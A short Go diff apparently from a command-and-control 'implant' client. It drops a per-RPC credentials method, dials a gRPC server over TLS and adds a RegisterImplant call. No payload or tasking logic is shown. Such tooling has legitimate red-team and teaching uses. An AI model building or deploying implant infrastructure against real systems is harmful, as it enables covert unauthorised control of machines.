@@ -23,13 +23,6 @@ type Register struct {
 	Name    string
 }
 
-// GetRequestMetadata gets the current request metadata
-func (s *Register) GetRequestMetadata(context.Context, ...string) (map[string]string, error) {
-	return map[string]string{
-		"name":    s.Name,
-	}, nil
-}
-
 func loadTLSCredentials() (credentials.TransportCredentials, error) {
 	// Load certificate of the CA who signed server's certificate
 	pemServerCA, err := ioutil.ReadFile("/etc/server/certs/ca.crt")
@@ -76,13 +69,13 @@ func main() {
 
 	opts = append(opts, grpc.WithTransportCredentials(tlsCredentials))
 	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 8010),
-		grpc.WithPerRPCCredentials(&whoami),
 		grpc.WithTransportCredentials(tlsCredentials)); err != nil {
 		log.Fatal(err)
 	}
 	defer conn.Close()
-	client = grpcapi.NewImplantClient(conn)
 
+	client = grpcapi.NewImplantClient(conn)
+	client.RegisterImplant(whoami)
 	ctx := context.Background()
 
 	for {
